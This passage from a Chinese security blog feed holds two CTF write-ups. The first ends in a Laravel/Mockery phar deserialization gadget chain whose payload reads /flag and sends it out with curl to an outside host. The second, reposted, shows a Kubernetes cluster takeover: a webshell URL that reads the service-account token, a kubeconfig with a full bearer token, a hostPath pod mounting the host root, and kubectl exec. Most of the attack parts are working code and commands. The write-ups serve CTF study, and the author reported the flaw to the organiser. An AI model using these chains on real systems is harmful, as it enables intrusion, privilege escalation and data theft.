punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BroadcastEvent</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MessageBag</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$inner</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span>    <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$evilCode</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MockConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockConfiguration</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefg'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php $s=base64_encode(file_get_contents("/flag"));system("curl http://xx.xx.xx.xx:5555/?a=".$s);exit; ?>'</span><span class="token punctuation">;</span>    <span class="token variable">$expected</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>MessageBag</span><span class="token punctuation">(</span><span class="token variable">$expected</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar.tar.gz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP2-走私"><a href="#HTTP2-走私" class="headerlink" title="HTTP2 走私"></a>HTTP2 走私</h3><p>原来 <code>/index.php/image</code> 真的是非预期。</p><p>ZeddYu 师傅的推文里有提到 HTTP2 走私才是预期解。</p><p>我这里贴一下 4qE 发给我的文章：<a href="https://www.anquanke.com/post/id/237140">BlackHat：HTTP 请求走私的新变体、新防御</a></p><p>等我把走私复现了再更新博客 233</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HFCTF2021-TinyPNG&quot;&gt;&lt;a href=&quot;#HFCTF2021-TinyPNG&quot; class=&quot;headerlink&quot; title=&quot;HFCTF2021 TinyPNG&quot;&gt;&lt;/a&gt;HFCTF2021 TinyPNG&lt;/h2&gt;&lt;p&gt;感谢 Naiveku</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>华为云 CTF cloud 非预期解之 k8s 渗透实战</title>
    <link href="https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2020-12-30T04:02:14.000Z</published>
    <updated>2021-10-18T04:10:16.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>转载自 Annevi</p><p>当时打比赛的时候觉得这是个很有意思的过程</p><p>转载记录一下</p><h2 id="0x00-题目入口发现"><a href="#0x00-题目入口发现" class="headerlink" title="0x00 题目入口发现"></a>0x00 题目入口发现</h2><p>拿到题目发现是一个类似于提供<code>IaaS</code>服务的站点，扫描了一波目录，发现几个文件以及路由:</p><pre class="line-numbers language-none"><code class="language-none">phpinfo.phprobots.txtadmin&#x2F;login&#x2F;static&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>挺奇怪的是，在一个存在phpinfo的环境下发现了一个<code>beego</code>框架后端的403界面：</p><p><img src="https://cdn.annevi.cn/image-20201220213938432.png" alt="image-20201220213938432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220213938432.png" class="lozad post-image"></p><p>初步猜测是<code>.php</code>的文件交给了nginx fastcgi进行处理，而其他路由则是交给了<code>beego</code>进行处理。</p><p>接着我们先看<code>/admin</code>路由，发现存在一个隐藏的表单</p><p><img src="https://cdn.annevi.cn/image-20201220142429113.png" alt="image-20201220142429113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142429113.png" class="lozad post-image"></p><p>因此自然的想到使用burpsuite进行弱口令的爆破，发现存在弱口令 <code>admin:admin</code></p><p>登录成功后返回了两个url， 下载 <code>tools.zip</code>，同时根据名字猜测<code>/wsproxy</code>是一个websocket的代理路由，而查看tools的源码发现是一个wsproxy的客户端程序。</p><p><img src="https://cdn.annevi.cn/image-20201220142540954.png" alt="image-20201220142540954" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142540954.png" class="lozad post-image"></p><p>至此，我们找到了进入内网的通道。</p><h2 id="0x01-wsproxy-进入内网"><a href="#0x01-wsproxy-进入内网" class="headerlink" title="0x01 wsproxy 进入内网"></a>0x01 wsproxy 进入内网</h2><p>直接对拿到的tools源码进行编译，获得客户端连接程序</p><p><img src="https://cdn.annevi.cn/image-20201220193029128.png" alt="image-20201220193029128" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193029128.png" class="lozad post-image"></p><p>根据使用说明，我们可以通过简单的命令连接上题目的<code>wsproxy</code>,同时密码为tools源码目录下的 <code>pass.txt</code>(UAF)，session就是我们登陆admin后，题目给的<code>beego session</code></p><p><img src="https://cdn.annevi.cn/image-20201220193124576.png" alt="image-20201220193124576" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193124576.png" class="lozad post-image"></p><p>这样会在本地的1080端口开启一个 socks5 代理，通过这个代理，我们就能够连入内网。</p><h2 id="0x02-phpinfo泄露k8s集群信息"><a href="#0x02-phpinfo泄露k8s集群信息" class="headerlink" title="0x02 phpinfo泄露k8s集群信息"></a>0x02 phpinfo泄露k8s集群信息</h2><p>由于这道题目的名称 <code>Cloud</code>以及在<code>phpinfo.php</code> 环境变量 中发现的大量service的信息以及<code>k8s api-server</code>地址，同时根据环境变量的名称与值来看，这是一个k8s集群。而我们的题目属于k8s集群中的一个pod。</p><p><img src="https://cdn.annevi.cn/image-20201220142706608.png" alt="image-20201220142706608" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142706608.png" class="lozad post-image"></p><h2 id="0x03-k8s基础架构介绍"><a href="#0x03-k8s基础架构介绍" class="headerlink" title="0x03 k8s基础架构介绍"></a>0x03 k8s基础架构介绍</h2><p>在继续深入下去之前，我们需要了解k8s的一些基础架构</p><p><img src="https://cdn.annevi.cn/architecture.png" alt="architecture" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/architecture.png" class="lozad post-image"></p><p>如上图所示，我们可以看到，Kubernetes集群主要分为 <code>Master</code>和<code>Node</code> 两部分，也是典型的分布式架构。</p><p>首先，外部应用程序通过<code>Api-Server</code>提供的 <code>HTTP</code> 接口与<code>Master</code>进行交互，而在与<code>APIs</code>进行交互前，需要经过一步认证的阶段。而 <code>Node</code>由多个<code>pod</code>组成，<code>pod</code>中运行着的便是大家比较熟悉的<code>容器</code>(通常来说是docker)，编写的服务(app)就运行在这些pod中的容器内。</p><p>其次，我们若是想将我们的pod发布出去，使其能够被公开访问，就需要了解<code>服务(Service)</code>。我们将运行在一组 <code>Pods</code> 上的应用程序公开为网络服务的抽象方法称作<code>服务</code>，<code>服务</code>上一般配置了能够被公开访问的 <strong>ip地址</strong>、<strong>端口映射关系</strong>等，通过服务我们就能够访问到相应的pods。</p><p>每一个<code>Node</code>上都有一个被称作<code>节点代理</code>的程序 <code>kubelet</code>，<code>Node</code>通过该程序向<code>Api-Server</code>汇报节点信息，以及接受相应的指令等。</p><p>从上面的架构中不难看出，如果我们要拿下整个集群，从外部看实际上就是需要获得暴露在外的<code>api-server</code>提供的REST api的访问权限。</p><h2 id="0x04-k8s-认证-token-泄露-配置不当"><a href="#0x04-k8s-认证-token-泄露-配置不当" class="headerlink" title="0x04 k8s 认证 token 泄露 + 配置不当"></a>0x04 k8s 认证 token 泄露 + 配置不当</h2><p>通过上面一步浅显的解了一下k8s的基础架构，我们可以继续往下看。</p><p>我们通过给的代理程序连接内网，访问<code>phpinfo</code>中泄露的 k8s api-server <code>https://10.247.0.1:443</code>，发现<code>api-server</code>居然暴露在代理能够<strong>直接访问</strong>到的网段上，但是直接访问提示我们401未授权，因此我们需要寻找一种可能的方式去通过此认证。</p><p><img src="https://cdn.annevi.cn/image-20201220142743378.png" alt="image-20201220142743378" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142743378.png" class="lozad post-image"></p><p>根据<code>phpinfo.php</code>文件中的内容来看，该集群中部署了很多很多的services，因此我们猜测所有的题目容器应该都是通过这个k8s进行编排管理的。</p><p>同时由于k8s集群部署的时候默认会在每个<code>pod</code>容器中挂载token文件到<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code><br>文件中，因此我们是可以通过其他题目所拿到的shell拿到这个token。</p><blockquote><p>ServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespace 指定了 pod 所在的 namespace，CA 用于验证 apiserver 的证书，token 用作身份验证。它们都通过 mount 的方式保存在 pod 的文件系统中，其中 token 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/token ，是 apiserver 通过私钥签发 token 的 base64 编码后的结果</p></blockquote><p>我们可以通过之前在 <code>webshell_1</code>题目所拿到的webshell，获取到<code>api-server</code>认证token</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;124.70.199.12:32003&#x2F;upload&#x2F;71a6e9b8-90b6-4d4f-9acd-bd91c8bbcc5e.jsp?pwd&#x3D;023&amp;i&#x3D;cat%20&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220143016309.png" alt="image-20201220143016309" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220143016309.png" class="lozad post-image"></p><p>至此，我们已经获得了<code>api-server</code>的访问权限，因此就相当于我们获取了k8s集群中的<code>master</code>权限。</p><h2 id="0x05-获取集群操纵权限"><a href="#0x05-获取集群操纵权限" class="headerlink" title="0x05 获取集群操纵权限"></a>0x05 获取集群操纵权限</h2><p>拿到了<code>api-server</code>的权限，我们就能够随心所欲的在集群中做想做的事了~ 其实做到这一步，大概就意识到这应该是一个<strong>平台漏洞</strong>，而不是本题的预期解法。因为拿到了<code>master</code>权限之后，我们已经能够查看/控制所有的<code>Pods</code>(web题目)，随意的获取我们想要题目的flag。</p><p>我们可以通过命令行工具 <code>kubectl</code>来对<code>api-server</code>进行操作。</p><p>创建一个<code>k8s.yaml</code>配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1clusters:- cluster:    insecure-skip-tls-verify: true    server: https:&#x2F;&#x2F;10.247.0.1  name: cluster-namecontexts:- context:    cluster: cluster-name    namespace: test    user: admin  name: admincurrent-context: adminkind: Configpreferences: &#123;&#125;users:- name: admin  user:    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本机通过题目的内网代理 执行以下命令远程连接进入题目的k8s集群，成功通过认证。</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220194341279.png" alt="image-20201220194341279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220194341279.png" class="lozad post-image"></p><p>至此，我们得到了访问<code>k8s api-server</code>的权限，下面我们尝试去获取<strong>集群master宿主机</strong>的权限。</p><p>通过执行</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml version --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220230951253.png" alt="image-20201220230951253" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220230951253.png" class="lozad post-image"></p><p>可以看到，k8s的版本号为 <code>v1.15.11</code>，这个版本的<code>k8s</code>授权默认是不会开启<code>RBAC(基于角色的访问控制)</code>的。</p><blockquote><p>在Kubernetes中，授权有ABAC（基于属性的访问控制）、RBAC（基于角色的访问控制）、Webhook、Node、AlwaysDeny（一直拒绝）和AlwaysAllow（一直允许）这6种模式。从1.6版本起，Kubernetes 默认启用RBAC访问控制策略。从1.8开始，RBAC已作为稳定的功能。</p></blockquote><p>因此如果运维在搭建集群环境的时候，没有设置 <code>--authorization-mode=RBAC</code> ，那么我们就可以通过拿下集群中的一个<code>pod</code>的shell，从而获取到token进行<code>api-server</code>的认证。很显然，经过上面的验证，<strong>运维在部署环境时并没有开启该访问控制</strong>。</p><h2 id="0x06-获取master-宿主机权限"><a href="#0x06-获取master-宿主机权限" class="headerlink" title="0x06 获取master 宿主机权限"></a>0x06 获取master 宿主机权限</h2><p>我们可以创建一个新的<code>pod</code>，通过<strong>文件挂载</strong>的方式，将宿主机根目录的所有文件挂载到<code>pod</code>中，但是由于创建<code>pod</code>时，需要从远程地址上拉取镜像，而该题内网貌似是无法出网的，因此我们需要找一个已经拉取下来的本地镜像文件。</p><p>执行以下命令，获取当前已经拉取过的images:</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get pods --all-namespaces --insecure-skip-tls-verify&#x3D;true -o jsonpath&#x3D;&quot;&#123;..image&#125;&quot; |\tr -s &#39;[[:space:]]&#39; &#39;\n&#39; |\sort |\uniq -c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：</p><p><img src="https://cdn.annevi.cn/image-20201220235708354.png" alt="image-20201220235708354" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220235708354.png" class="lozad post-image"></p><p>尝试几个镜像后，发现 <code>100.125.4.222:20202/hwofficial/coredns:1.15.6</code>是可以使用的</p><p>yaml配置如下：</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: test-444spec:  containers:  - name: test-444    image: 100.125.4.222:20202&#x2F;hwofficial&#x2F;coredns:1.15.6    volumeMounts:    - name: host      mountPath: &#x2F;host  volumes:  - name: host    hostPath:      path: &#x2F;      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述配置将宿主机的根目录挂载到了我们pod中的 <code>/host</code>目录，执行以下命令在default命名空间中创建该pod</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml apply -f pod.yaml -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再通过kubectl exec 进入我们的pod中，以实现对宿主机文件的控制。</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml exec -it test-444 bash -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至此，我们所获得的权限其实已经和主办方运维同样高了。。</p><h2 id="0x07-获取flag"><a href="#0x07-获取flag" class="headerlink" title="0x07 获取flag"></a>0x07 获取flag</h2><p>通过以上的步骤，大概明白了这是一个非预期，平台配置token的泄露外加没有开启<code>RBAC</code>授权，导致我们轻易的就能够获取到了k8s集群的最高权限。因此我们也就获得了该集群中所有题目容器的最高权限。</p><p>在整个集群中，我们需要寻找属于我们队伍的pod，以便获得对应的flag。</p><p>因此我们首先通过查询在k8s中用于服务暴露的service信息：</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get services -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220210356220.png" alt="image-20201220210356220" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210356220.png" class="lozad post-image"></p><p>可以看到，列出了所有的service，同时还有集群ip以及端口映射的关系。这里我们就可以通过暴露在公网上的端口，来定位对应的service。</p><p>例如我们的公网端口为30067，则我们搜索30067端口</p><p><img src="https://cdn.annevi.cn/image-20201220210520978.png" alt="image-20201220210520978" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210520978.png" class="lozad post-image"></p><p>得到了我们题目pod所在的service，接着我们获取这个service的详细信息，以便得到<code>pod name</code>，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe service guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220210704982.png" alt="image-20201220210704982" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210704982.png" class="lozad post-image"></p><p>从这里大致可以看出，app名为<code>guosai-34-15</code>，因此我们相应的去所有的pod中寻找名为这一项的pod。</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe pods guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过对我们获取的数据的检索，发现了这样一个pod，通过比较虚拟ip与phpinfo中的信息，可以确定这个pod就是我们要找的那个。</p><p><img src="https://cdn.annevi.cn/image-20201220210832990.png" alt="image-20201220210832990" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210832990.png" class="lozad post-image"></p><p>因此便得到了属于我们的pod。exec进入pod后，便可以得到flag。</p><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>在拿下master之后，我们立即联系了赛事主办方，经过确认这是一个平台的严重安全漏洞~也得到了主办方的感谢。</p><p><img src="https://cdn.annevi.cn/image-20201228105129055.png" alt="image-20201228105129055" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105129055.png" class="lozad post-image"></p><p><img src="https://cdn.annevi.cn/image-20201228105105601.png" alt="image-20201228105105601" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105105601.png" class="lozad post-image"></p><p><img src="https://cdn.annevi.cn/image-20201228105113374.png" alt="image-20201228105113374" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" 